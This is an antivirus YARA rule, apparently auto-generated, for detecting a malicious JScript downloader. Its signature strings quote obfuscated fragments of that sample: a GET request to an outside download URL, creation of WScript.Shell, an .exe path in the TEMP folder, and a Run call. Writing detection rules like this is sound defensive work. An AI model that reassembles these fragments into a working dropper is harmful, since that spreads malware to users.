rule sig_20160401_4ad8334f07ed3dd6a8b7d4fc4ec87ec0 {
  meta:
    description = "datamaliciousorder - file 20160401_4ad8334f07ed3dd6a8b7d4fc4ec87ec0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d0c3d9fc08288832c2f36cece1fb55519d3ec56307311ebd8abbfcddfc31c46c"

  strings:
    $s1  = "HjsCzs[NwZt](\"G\" + \"ET\", \"http://be-stlines-tore.com/l9sape\", false);" fullword ascii
    $s2  = "var SunVou = function XmZg() {return WScript[DbwLg](\"WScript\"+\".Shell\");}(), HoFcb = 11;" fullword ascii
    $s3  = "function BhnYl(YzWwh, CreSe){MmhNdm = MmhNdm * 1; return YzWwh - CreSe;};" fullword ascii
    $s4  = "if (HjsCzs[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DapTf(){return FxxMd + \"\";};" fullword ascii
    $s6  = "function FltMwk() {return SunVou[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"cMVsGIBT6FrNZ.ex\" + \"e\";};" fullword ascii
    $s7  = "function DjTy() {return ((RpxXd == true) && (RpxXd == HlrRga)) ? 1 : MmhNdm;};" fullword ascii
    $s8  = "}while (MexJu);" fullword ascii
    $s9  = "function QtsQs(){return DbwLg;};" fullword ascii
    $s10 = "var HlrRga = false;" fullword ascii
    $s11 = "RpxXd = true; " fullword ascii
    $s12 = "function EzPm(GxDm){SunVou[\"R\"+\"un\"](GxDm, MmhNdm, MmhNdm);};" fullword ascii
    $s13 = "return BhnYl(SifAlz, QoXv);" fullword ascii
    $s14 = "HlrRga = true; " fullword ascii
    $s15 = "var RpxXd = false;" fullword ascii
    $s16 = "function EoRlf(){return 23;};" fullword ascii
    $s17 = "function YrFko()" fullword ascii
    $s18 = "function MuPi(NpEw) {var MuiGn = (1, 2, 3, 4, 5, NpEw); return MuiGn;};" fullword ascii
    $s19 = "var NfkZp = false;" fullword ascii
    $s20 = "var PlWrr = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}